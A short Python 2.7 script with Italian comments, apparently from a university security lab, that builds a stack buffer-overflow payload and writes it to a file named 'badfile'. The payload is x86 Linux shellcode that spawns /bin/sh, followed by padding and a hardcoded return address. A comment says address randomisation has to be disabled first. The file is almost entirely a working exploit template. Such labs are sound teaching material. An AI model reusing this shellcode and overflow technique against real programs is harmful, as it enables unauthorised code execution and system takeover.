# NOTE: for python 2.7
# comando per uscire salvando: esc + :wq

import os 
import struct

#lo shellcode dovrebbe darlo il prof
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
#per fare in modo che non cambino sempre gli indirizzi bisogna togliere la randomizzazione e per farlo bisogna andare da admin
buffer = 0xbffff226 # dovrebbe essere l'indirizzo di buffer1 in particolare

#[shellcode][padding][ret]
# 28 + 4 = 32
padding = 58 - len(shellcode)


#buffer overflow
payload = shellcode
payload += "A"*padding
payload += struct.pack("I", buffer)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()

#os.system("./vuln \"%s\"\"%s\"" % payload % payload1 )
